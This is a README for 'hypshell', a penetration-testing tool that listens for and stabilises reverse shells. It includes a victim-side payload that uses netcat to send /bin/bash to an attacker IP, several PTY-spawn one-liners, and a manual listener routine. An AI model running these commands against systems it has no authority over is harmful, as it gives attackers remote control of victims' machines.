# hypshell
A simple reverse shell handler and stabilizer
# Usage
`usage: ./hypshell.py [options] port`

You can run the script on the attacking machine to listen for incoming connections.

Run this payload on the victim to start a reverse shell:
`nc -c /bin/bash <attacker_ip> <port>`

**NOTE: To exit the program you have to enter "exit" in the shell session even if you can't read the input**

To make the script executable you can run: `chmod +x hypshell.py`
## Options
```
usage: ./hypshell.py [options] port

positional arguments:
  port                  port number

options:
  -h, --help            show this help message and exit
  -m method, --method method
                        stabilize the connection using the specified method (default: script)
  -v, --verbose         verbose mode
  -i interface, --interface interface
                        specify the network interface to use
  -n, --normal          use normal mode instead of alternate screen
  -c, --stabilize       do not stabilize the connection
  -e, --echo            echo input
  -s shell, --shell shell
                        specify the full path of the shell to use (default: /bin/bash)
  -t, --sigint          handle SIGINT signal
  -r, --sigterm         handle SIGTERM signal
  -q, --sigquit         handle SIGQUIT signal
  -x address, --connect address
                        connect to specified address instead of bind
```
### Examples:
Start a reverse shell listener on port 4242 and start an alternative screen:

`hypshell.py 4242`

Handle `^\` to exit the program:

`hypshell.py 4242 -q`

Use connect mode and verbose:

`hypshell.py 4242 -vx 127.0.0.1`

Set shell to `/bin/sh` and use python3 PTY stabilization method:

`hypshell.py 4242 -s /bin/sh -m python3`

# Built-in Methods
Feel free to append your own methods to the code.
```shell
script: /usr/bin/script -qc {shell} /dev/null
socat: /usr/bin/socat exec:'{shell} -li',pty,stderr,setsid,sigint,sane tcp-connect
python3: python3 -c 'import pty; pty.spawn("{shell}")'
perl: perl -e 'exec "{shell}";'
ruby: ruby -e 'exec "{shell}";'
lua: lua -e 'os.execute("{shell}")'
echo: echo os.system('{shell}')
```
# Why?
This tool is used to replace a basic reverse shell listener such as netcat or socat,
instead of running:
```shell
nc -lnvp 4242
/usr/bin/script -qc /bin/bash /dev/null
export TERM=xterm
^Z
stty raw -echo
fg
```
You can just run 1 simple command that will do everything for you:
```shell
hypshell.py 4242
```
# License
GPLv3
# TODO
- add more stabilization methods
- rewrite the tool in C and upload binaries
- more
